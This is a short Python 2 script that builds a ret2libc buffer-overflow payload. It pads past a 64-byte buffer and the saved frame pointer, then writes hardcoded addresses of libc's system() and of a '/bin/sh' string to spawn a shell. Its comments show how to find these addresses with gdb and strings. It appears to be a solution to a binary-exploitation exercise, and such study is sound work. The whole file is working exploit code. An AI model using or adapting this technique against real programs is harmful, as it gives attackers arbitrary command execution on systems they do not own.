#!/usr/bin/python2.6

import struct

buffer_sz = 64
ovw_stack_frame_sz = 76 # Overwritable stack frame, starting from buffer until we reach ebp (exclusive) 

# How to find the address:
# (gdb) p system
system = struct.pack("P", 0xb7ecffb0) # Address of the libc "system" function
return_after_system = struct.pack("P", 0x41414141)          # "AAAA". Address to which we will return after system completes

# How to find the address:
# (gdb) info proc map
# $ strings -a -t x /lib/libc-2.11.2.so | grep bin
# (gdb) x/s 0xb7e97000+0x11f3bf
bin_sh = struct.pack("P", 0xb7fb63bf) # In this address resides the string "/bin/sh\0"

system_stack_frame = return_after_system + bin_sh # This is what a caller to system would write on the stack before performing a JMP to system

padding = "A"*(ovw_stack_frame_sz+4) # We also overwrite old ebp

payload = padding + system + system_stack_frame
print(payload)
